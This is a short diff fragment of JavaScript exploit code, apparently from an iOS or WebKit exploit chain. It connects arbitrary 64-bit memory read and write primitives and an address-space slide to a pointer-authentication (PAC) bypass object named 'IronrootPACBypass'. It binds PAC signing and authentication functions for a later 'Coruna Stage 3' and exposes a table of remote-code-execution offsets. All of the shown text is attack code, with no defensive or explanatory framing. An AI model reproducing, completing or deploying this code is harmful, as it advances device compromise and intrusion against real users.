+    read64: (addr) => ep.readRawBigInt(addr),
+    write64: (addr, val) => ep.write64(addr, val),
+    read32: (addr) => BigInt(ep.read32(addr)),
+    slide: platformModule.platformState.slide || 0n,
+  };
+
+  const bypass = new IronrootPACBypass(p, offsets, p.slide);
+
+  // Bind PAC operations expected by Coruna Stage 3
+  bypass.da = bypass.pacda.bind(bypass);
+  bypass.er = bypass.pacia.bind(bypass);
+  bypass.ha = bypass.autia.bind(bypass);
+  bypass.wa = bypass.autda.bind(bypass);
+
+  window.log("[IRONROOT] PAC bypass instance created (requires multi-phase setup)");
+  return bypass;
 };
+
+/**
+ * r.offsets — expose offset table for external use
+ */
+r.offsets = rce_offsets;
 
 return r;
